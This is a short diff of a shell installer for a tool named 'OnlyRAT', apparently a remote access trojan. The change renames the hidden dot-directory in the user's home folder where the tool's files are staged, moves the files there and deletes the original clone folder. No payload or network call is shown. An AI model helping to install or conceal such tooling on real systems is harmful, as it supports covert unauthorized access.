@@ -4,11 +4,11 @@
 
 # staging
 echo [*] Staging process...
-mkdir ~/.OnlyRAT
+mkdir ~/.MK01-OnlyRAT
 cd ..
-mv MK01-OnlyRAT/* ~/.OnlyRAT
-rm -rf OnlyRAT
-cd ~/.OnlyRAT
+mv MK01-OnlyRAT/* ~/.MK01-OnlyRAT
+rm -rf MK01-OnlyRAT
+cd ~/.MK01-OnlyRAT
 echo [+] Completed
 
 #  get tools
